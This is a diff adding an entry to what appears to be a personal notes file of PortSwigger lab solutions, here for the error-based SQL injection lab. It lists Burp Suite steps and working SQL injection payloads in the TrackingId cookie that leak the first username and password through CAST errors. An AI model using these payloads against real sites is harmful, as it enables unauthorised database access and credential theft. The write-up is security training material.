@@ -275,3 +275,24 @@ Steps:
 	13b. Payload set 1: 1-20
 	13c. Payload set 2: a-z and 0-9
 ```
+
+###### Lab: Visible error-based SQL injection
+URL: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based
+Endpoint: TrackingId
+
+Steps:
+```
+1. Open Burp Suite
+2. Intercept the request and send it to repeater.
+3. TrackingId=3EBPs6MjysiXEHuK
+   Response: 200 response
+4. TrackingId=3EBPs6MjysiXEHuK'
+   Response: 500 internal error
+5. TrackingId=gznNxrDf3v7Md8mV'+OR+1=1--;
+   Response: 200 response
+6. which means that sql injection exists
+7. TrackingId='AND+1=CAST((SELECT+username+FROM+users+LIMIT+1)+AS+int)--;
+	7a. leaks the first username
+1. TrackingId='AND+1=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--;
+	8a. leaks the first password
+```
